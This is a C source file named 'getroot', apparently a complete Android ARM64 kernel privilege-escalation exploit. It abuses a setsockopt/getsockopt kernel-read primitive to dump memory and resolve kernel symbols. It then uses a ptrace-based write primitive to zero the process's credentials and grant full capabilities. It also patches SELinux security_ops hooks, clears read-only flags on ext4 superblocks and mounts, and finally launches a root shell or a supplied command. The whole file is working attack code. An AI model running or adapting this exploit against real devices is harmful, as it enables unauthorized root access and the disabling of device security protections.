/* getroot 2013/12/07 */

/*
 * Copyright (C) 2013 CUBE
 * Copyright (C) 2015 Chengyu Song
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define KERNEL_START_ADDRESS 0xffffffc000080000UL
#define KERNEL_SIZE 0x2000000
#define SEARCH_START_ADDRESS 0xffffffc000a54a00UL
//#define SEARCH_START_ADDRESS 0xffffffc000623800UL
#define KALLSYMS_SIZE 0x200000
#define EXECCOMMAND "/system/bin/sh"

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/system_properties.h>

unsigned long *kallsymsmem = NULL;

unsigned long pattern_kallsyms_addresses[] = {
    0xffffffc000080000UL, /* _text */
    0xffffffc000080040UL, /* stext */
    0xffffffc000080080UL  /* el2_setup */
};
unsigned long kallsyms_num_syms;
unsigned long *kallsyms_addresses;
unsigned char *kallsyms_names;
unsigned char *kallsyms_token_table;
unsigned short *kallsyms_token_index;
unsigned long *kallsyms_markers;

unsigned long init_task_address = 0;
unsigned long security_ops_address = 0;
unsigned long default_security_ops_address = 0;
unsigned long cap_capable_address = 0;
unsigned long cap_sb_mount_address = 0;
unsigned long cap_sb_remount_address = 0;
unsigned long super_blocks_address = 0;
unsigned long mount_hashtable_address = 0;

struct cred;
struct task_struct;

typedef struct __user_cap_header_struct {
    unsigned version;
    int pid;
} cap_user_header_t;

typedef struct __user_cap_data_struct {
    unsigned effective;
    unsigned permitted;
    unsigned inheritable;
} cap_user_data_t;

bool bChiled;

int read_value_at_address(unsigned long address, unsigned long *value) {
    int sock;
    int ret;
    int i;
    unsigned long addr = address;
    unsigned char *pval = (unsigned char *)value;
    socklen_t optlen = 1;

    *value = 0;
    errno = 0;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        fprintf(stderr, "socket() failed: %s.\n", strerror(errno));
        return -1;
    }

    for (i = 0; i < sizeof(*value); i++, addr++, pval++) {
        errno = 0;
        ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)addr, 1);
        if (ret != 0) {
            if (errno != EINVAL) {
                fprintf(stderr, "setsockopt() failed: %s.\n", strerror(errno));
                close(sock);
                *value = 0;
                return -1;
            }
        }
        errno = 0;
        optlen = 1;
        ret = getsockopt(sock, SOL_IP, IP_TTL, pval, &optlen);
        if (ret != 0) {
            fprintf(stderr, "getsockopt() failed: %s.\n", strerror(errno));
            close(sock);
            *value = 0;
            return -1;
        }
    }

    close(sock);

    return 0;
}

unsigned long *kerneldump(unsigned long startaddr, unsigned long dumpsize) {
    unsigned long addr;
    unsigned long val;
    unsigned long *allocaddr;
    unsigned long *memaddr;
    int cnt, num, divsize;

    printf("kernel dump...\n");
    allocaddr = (unsigned long *)malloc(dumpsize);
    if (allocaddr == NULL) {
        fprintf(stderr, "malloc failed: %s.\n", strerror(errno));
        return NULL;
    }
    memaddr = allocaddr;

    cnt = 0;
    num = 0;
    divsize = dumpsize / 10;
    for (addr = startaddr; addr < (startaddr + dumpsize); addr += 8, memaddr++) {
        if (read_value_at_address(addr, &val) != 0) {
            printf("\n");
            fprintf(stderr, "kerneldump failed: %s.\n", strerror(errno));
            return NULL;
        }
        *memaddr = val;
        cnt += 8;
        if (cnt >= divsize) {
            cnt = 0;
            num++;
            printf("%d ", num);
            fflush(stdout);
        }
    }

    printf("\n");
    return allocaddr;
}

int check_pattern(unsigned long *addr, unsigned long *pattern, int patternnum) {
    unsigned long val;
    unsigned long cnt;
    unsigned long i;

    read_value_at_address((unsigned long)addr, &val);
    if (val == pattern[0]) {
        cnt = 1;
        for (i = 1; i < patternnum; i++) {
            read_value_at_address((unsigned long)(&addr[i]), &val);
            if (val == pattern[i]) {
                cnt++;
            } else {
                break;
            }
        }
        if (cnt == patternnum) {
            return 0;
        }
    }

    return -1;
}

int check_kallsyms_header(unsigned long *addr) {
    if (check_pattern(addr, pattern_kallsyms_addresses, sizeof(pattern_kallsyms_addresses) / sizeof(addr)) == 0) {
        return 0;
    }

    return -1;
}

int get_kallsyms_addresses() {
    unsigned long *endaddr;
    unsigned long i, j;
    unsigned long *addr;
    unsigned long n;
    unsigned long val = 0;
    unsigned long off;
    int cnt, num;

    if (read_value_at_address(KERNEL_START_ADDRESS + 0x38, &val) != 0) {
        fprintf(stderr, "this device is not supported.\n");
        return -1;
    }
    printf("magic = %lx\n", val);
    printf("search kallsyms...\n");
    endaddr = (unsigned long *)(KERNEL_START_ADDRESS + KERNEL_SIZE);
    cnt = 0;
    num = 0;
    for (i = 0; i < (KERNEL_START_ADDRESS + KERNEL_SIZE - SEARCH_START_ADDRESS); i += 16) {
        for (j = 0; j < 2; j++) {
            cnt += 8;
            if (cnt >= 0x10000) {
                cnt = 0;
                num++;
                printf("%d ", num);
                fflush(stdout);
            }

            /* get kallsyms_addresses pointer */
            if (j == 0) {
                kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS + i);
            } else {
                if ((i == 0) || ((SEARCH_START_ADDRESS - i) < KERNEL_START_ADDRESS)) {
                    continue;
                }
                kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS - i);
            }
            if (check_kallsyms_header(kallsyms_addresses) != 0) {
                continue;
            }
            addr = kallsyms_addresses;
            off = 0;

            /* search end of kallsyms_addresses */
            n = 0;
            while (1) {
                read_value_at_address((unsigned long)addr, &val);
                if (val < KERNEL_START_ADDRESS) {
                    break;
                }
                n++;
                addr++;
                off++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            /* skip there is filled by 0x0 */
            while (1) {
                read_value_at_address((unsigned long)addr, &val);
                if (val != 0) {
                    break;
                }
                addr++;
                off++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            read_value_at_address((unsigned long)addr, &val);
            kallsyms_num_syms = val;
            addr++;
            off++;
            if (addr >= endaddr) {
                return -1;
            }

            /* check kallsyms_num_syms */
            if (kallsyms_num_syms != n) {
                continue;
            }

            if (num > 0) {
                printf("\n");
            }
            printf("(kallsyms_addresses=%lx)\n", (unsigned long)kallsyms_addresses);
            printf("(kallsyms_num_syms=%lx)\n", kallsyms_num_syms);
            kallsymsmem = kerneldump((unsigned long)kallsyms_addresses, KALLSYMS_SIZE);
            if (kallsymsmem == NULL) {
                return -1;
            }
            endaddr = (unsigned long *)((unsigned long)kallsymsmem + KALLSYMS_SIZE);

            addr = &kallsymsmem[off];

            /* skip there is filled by 0x0 */
            while (addr[0] == 0x0) {
                addr++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            kallsyms_names = (unsigned char *)addr;
            printf("(kallsyms_names=%lx)\n", ((unsigned long)addr - (unsigned long)kallsymsmem + (unsigned long)kallsyms_addresses));

            /* search end of kallsyms_names */
            for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
                int len = kallsyms_names[off];
                off += len + 1;
                if (&kallsyms_names[off] >= (unsigned char *)endaddr) {
                    return -1;
                }
            }

            /* adjust */
            addr = (unsigned long *)((((unsigned long)&kallsyms_names[off] - 1) | 0x7) + 1);
            if (addr >= endaddr) {
                return -1;
            }

            /* skip there is filled by 0x0 */
            while (addr[0] == 0x0) {
                addr++;
                if (addr >= endaddr) {
                    return -1;
                }
            }
            /* but kallsyms_markers shoud be start 0x00000000 */
            addr--;

            kallsyms_markers = addr;
            printf("(kallsyms_markers=%lx)\n", ((unsigned long)addr - (unsigned long)kallsymsmem + (unsigned long)kallsyms_addresses));

            /* end of kallsyms_markers */
            addr = &kallsyms_markers[((kallsyms_num_syms - 1) >> 8) + 1];
            if (addr >= endaddr) {
                return -1;
            }

            /* skip there is filled by 0x0 */
            while (addr[0] == 0x0) {
                addr++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            kallsyms_token_table = (unsigned char *)addr;
            printf("(kallsyms_token_table=%lx)\n", ((unsigned long)addr - (unsigned long)kallsymsmem + (unsigned long)kallsyms_addresses));

            i = 0;
            while ((kallsyms_token_table[i] != 0x00) || (kallsyms_token_table[i + 1] != 0x00)) {
                i++;
                if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
                    return -1;
                }
            }

            /* skip there is filled by 0x0 */
            while (kallsyms_token_table[i] == 0x00) {
                i++;
                if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
                    return -1;
                }
            }

            /* but kallsyms_markers shoud be start 0x0000 */
            kallsyms_token_index = (unsigned short *)&kallsyms_token_table[i - 2];
            kallsyms_addresses = kallsymsmem;

            return 0;
        }
    }

    if (num > 0) {
        printf("\n");
    }
    return -1;
}

unsigned long kallsyms_expand_symbol(unsigned long off, char *namebuf) {
    int len;
    int skipped_first;
    unsigned char *tptr;
    unsigned char *data;

    /* Get the compressed symbol length from the first symbol byte. */
    data = &kallsyms_names[off];
    len = *data;
    off += len + 1;
    data++;

    skipped_first = 0;
    while (len > 0) {
        tptr = &kallsyms_token_table[kallsyms_token_index[*data]];
        data++;
        len--;

        while (*tptr > 0) {
            if (skipped_first != 0) {
                *namebuf = *tptr;
                namebuf++;
            } else {
                skipped_first = 1;
            }
            tptr++;
        }
    }
    *namebuf = '\0';

    return off;
}

int search_functions() {
    char namebuf[1024];
    unsigned long i;
    unsigned long off;
    int cnt;

    cnt = 0;
    for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
        off = kallsyms_expand_symbol(off, namebuf);
        //printf("sym = %s\n", namebuf);
        if (strcmp(namebuf, "init_task") == 0) {
            printf("init_task @ %ld\n", i);
            init_task_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "security_ops") == 0) {
            printf("security_ops @ %ld\n", i);
            security_ops_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "default_security_ops") == 0) {
            printf("default_security_ops @ %ld\n", i);
            default_security_ops_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "cap_capable") == 0) {
            printf("cap_capable @ %ld\n", i);
            cap_capable_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "cap_sb_mount") == 0) {
            printf("cap_sb_mount @ %ld\n", i);
            cap_sb_mount_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "cap_sb_remount") == 0) {
            printf("cap_sb_remount @ %ld\n", i);
            cap_sb_remount_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "super_blocks") == 0) {
            printf("super_blocks @ %ld\n", i);
            super_blocks_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "mount_hashtable") == 0) {
            printf("mount_hashtable @ %ld\n", i);
            mount_hashtable_address = kallsyms_addresses[i];
            cnt++;
        }
    }

    if (cnt < 3) {
        return -1;
    }

    return 0;
}

int get_addresses() {
    if (get_kallsyms_addresses() != 0) {
        if (kallsymsmem != NULL) {
            free(kallsymsmem);
            kallsymsmem = NULL;
        }
        fprintf(stderr, "kallsyms_addresses search failed.\n");
        return -1;
    }

    if (search_functions() != 0) {
        if (kallsymsmem != NULL) {
            free(kallsymsmem);
            kallsymsmem = NULL;
        }
        fprintf(stderr, "search_functions failed.\n");
        return -1;
    }

    if (kallsymsmem != NULL) {
        free(kallsymsmem);
        kallsymsmem = NULL;
    }

    printf("\n");
    printf("init_task=%lx\n", init_task_address);
    printf("security_ops=%lx\n", security_ops_address);
    printf("default_security_ops=%lx\n", default_security_ops_address);
    printf("cap_capable=%lx\n", cap_capable_address);
    printf("cap_sb_mount=%lx\n", cap_sb_mount_address);
    printf("cap_sb_remount=%lx\n", cap_sb_remount_address);
    printf("super_blocks=%lx\n", super_blocks_address);
    printf("mount_hashtable=%lx\n", mount_hashtable_address);
    printf("\n");

    return 0;
}

void ptrace_write_values_at_address(unsigned long address, unsigned long *values, size_t size) {
    pid_t pid;
    long ret;
    int status;
    unsigned long *value;

    bChiled = false;
    pid = fork();
    if (pid < 0) {
        printf("failed to fork\n");
        return;
    }
    if (pid == 0) {
        ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
        if (ret < 0) {
            fprintf(stderr, "PTRACE_TRACEME failed\n");
        }
        bChiled = true;
        signal(SIGSTOP, SIG_IGN);
        kill(getpid(), SIGSTOP);
        exit(EXIT_SUCCESS);
    }

    do {
        ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
    } while (!bChiled);

    value = values;
    while (size) {
        ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, (void *)value, (void *)address);
        if (ret < 0) {
            fprintf(stderr, "PTRACE_PEEKDATA failed: %s\n", strerror(errno));
        }

        address += sizeof(long);
        value++;
        size -= sizeof(long);
    }

    kill(pid, SIGKILL);
    waitpid(pid, &status, WNOHANG);
}

bool find_current_task(unsigned long *task) {

    unsigned long current_task;
    unsigned long val;
    pid_t pid, cp;
    
    *task = 0;
    if (init_task_address == 0)
        return false;

    pid = getpid();
    printf("current pid = %d\n", pid);
   
    current_task = init_task_address;
    do {
        read_value_at_address(current_task + 624, &val); //tsk.tasks.prev
        current_task = val - 616;
        read_value_at_address(current_task + 720, &val);
        cp = (pid_t)(val & 0xffffffff);
        //printf("task_struct = %lx, pid = %d\n", current_task, cp);
        if (cp == pid) {
            *task = current_task;
            return true;
        }
    } while (current_task != init_task_address);

    return false;
}

bool get_root() {

    unsigned long current_task;
    unsigned long current_cred;
    unsigned long ids[] = {0, 0, 0, 0};
    unsigned long caps[] = {~0, ~0, ~0};

    if (!find_current_task(&current_task)) {
        fprintf(stderr, "Failed to locate task_struct for current process\n");
        return false;
    }
    printf("Get task_struct for current process: %lx\n", current_task);

    read_value_at_address(current_task + 1144, &current_cred);
    printf("Get cred for current process: %lx\n", current_cred);

    // get root
    ptrace_write_values_at_address(current_cred + 4, ids, sizeof(ids));
    // get CAP_FULL_SET
    ptrace_write_values_at_address(current_cred + 40, caps, sizeof(caps));

    return true;
}

bool fix_selinux() {
    unsigned long security_ops;
    unsigned long capable;
    unsigned long sb_mount;
    unsigned long sb_remount;

    printf("\n");

    read_value_at_address(security_ops_address, &security_ops);
    printf("security_ops = %lx\n", security_ops);

    read_value_at_address(security_ops + 80, &capable);
    printf("capable = %lx\n", capable);

    ptrace_write_values_at_address(security_ops + 80,
            &cap_capable_address, sizeof(unsigned long));

    read_value_at_address(security_ops + 224, &sb_mount);
    printf("sb_mount = %lx\n", sb_mount);

    ptrace_write_values_at_address(security_ops + 224,
            &cap_sb_mount_address, sizeof(unsigned long));

    read_value_at_address(security_ops + 192, &sb_remount);
    printf("sb_remount = %lx\n", sb_remount);

    ptrace_write_values_at_address(security_ops + 192,
            &cap_sb_remount_address, sizeof(unsigned long));

    return true;
}

bool fix_mnt(unsigned long super_block) {

    unsigned long mount_hashtable;
    unsigned long head;
    unsigned long tmp;
    unsigned long vfsmount;
    unsigned long val;
    int i;

    if (mount_hashtable_address == 0)
        return false;

    read_value_at_address(mount_hashtable_address, &mount_hashtable);

    for (i = 0; i < 4096; i += 16) {
        // enumerate all buckets
        read_value_at_address(mount_hashtable + i, &head);

        // traverse bucket list
        tmp = head;
        while (1) {
            read_value_at_address(tmp, &val); // tmp.next
            tmp = val;
            if (tmp == head)
                break;

            vfsmount = tmp + 32;
            read_value_at_address(vfsmount + 8, &val); //vfsmount.mnt_sb
            if (val == super_block) {
                printf("found mnt (%lx) for super_block (%lx), ",
                        vfsmount, super_block);

                read_value_at_address(vfsmount + 16, &val);
                printf("flags = %lx\n", val & 0xffffffff);

                val &= 0xffffffffffffffbf;
                ptrace_write_values_at_address(vfsmount + 16,
                    &val, sizeof(unsigned long));

                return true;
            }
        }
    }

    return false;
}

bool fix_mnt2(unsigned long super_block) {

    unsigned long s_mounts;
    unsigned long tmp;
    unsigned long mnt_flags;
    unsigned long val;

    tmp = s_mounts = super_block + 192;
    while (1) {
        read_value_at_address(tmp, &val);
        tmp = val;
        if (tmp == s_mounts)
            break;

        read_value_at_address(tmp - 48, &val); //vfsmount.mnt_flags
        mnt_flags = val & 0xffffffff;
        //printf("mnt = %lx, flags == %lx\n", tmp - 64, val);

        if (mnt_flags == 0x1060) {
            val &= 0xffffffffffffffbf;
            ptrace_write_values_at_address(tmp - 48,
                &val, sizeof(unsigned long));

            return true;
        }
    }

    return true;
}

bool fix_super_blocks() {

    unsigned long super_block;
    unsigned long bdev;
    unsigned long bd_part;
    unsigned long val;

    if (super_blocks_address == 0)
        return false;

    printf("\n");

    super_block = super_blocks_address;
    while (1) {
        read_value_at_address(super_block, &val); //super_block.s_list.next
        super_block = val;
        //printf("super_block = %lx\n", super_block);

        if (super_block == super_blocks_address)
            break;

        // check EXT4_SUPER_MAGIC
        read_value_at_address(super_block + 88, &val);
        if (val != 0xEF53)
            continue;

        printf("EXT4 partition, ");

        // fix sb->s_bdev->bd_part->policy
        read_value_at_address(super_block + 288, &val);
        bdev = val;
        //printf("bdev = %lx\n", bdev);

        read_value_at_address(bdev + 144, &val);
        bd_part = val;
        //printf("bd_part = %lx\n", bd_part);

        read_value_at_address(bd_part + 720, &val);
        printf("bd policy = %ld, ", val & 0xffffffff);

        val &= 0xffffffff00000000UL; // the low 32-bit
        ptrace_write_values_at_address(bd_part + 720,
                &val, sizeof(unsigned long));

        // fix sb->s_flags
        read_value_at_address(super_block + 80, &val);
        printf("s_flags = %lx\n", val);

        val &= 0xfffffffffffffffe;
        ptrace_write_values_at_address(super_block + 80,
                &val, sizeof(unsigned long));

        if (!fix_mnt2(super_block)) {
            fprintf(stderr, "Failed to fix mnt_flags\n");
            return false;
        }
    }

    return true;
}

static bool run_exploit(void) {

    if (!get_root()) {
        fprintf(stderr, "Failed to get root\n");
        return false;
    }

    if (!fix_selinux()) {
        fprintf(stderr, "Failed to fix SELinux\n");
        return false;
    }

    if (!fix_super_blocks()) {
        fprintf(stderr, "Failed to fix SUPER BLOCK\n");
        return false;
    }

    return true;
}

int main(int argc, char **argv) {

    if (get_addresses() != 0) {
        exit(EXIT_FAILURE);
    }
    printf("Succeeded in get address\n");

    printf("uid = %d\n", getuid());

    run_exploit();

    if (getuid() != 0) {
        printf("Failed to getroot.\n");
        exit(EXIT_FAILURE);
    }

#if 0
    cap_user_header_t cap_hdr = {0x20080522, 0};
    cap_user_data_t cap_data[2];
    if (syscall(__NR_capget, &cap_hdr, cap_data) < 0) {
        printf("Failed to get capabilities\n");
        exit(EXIT_FAILURE);
    }
    printf("capabilities = %x %x %x %x %x %x\n",
            cap_data[0].effective, cap_data[1].effective,
            cap_data[0].permitted, cap_data[1].permitted,
            cap_data[0].inheritable, cap_data[1].inheritable);

    if (access("/system/bin/sh", W_OK) != 0) {
        printf("Failed to bypass ro mount %d\n", errno);
        exit(EXIT_FAILURE);
    }
#endif

    printf("Succeeded in getroot!\n");
    printf("\n");

    if (argc >= 2) {
        system(argv[1]);
    } else {
        system(EXECCOMMAND);
    }

    return 0;
}
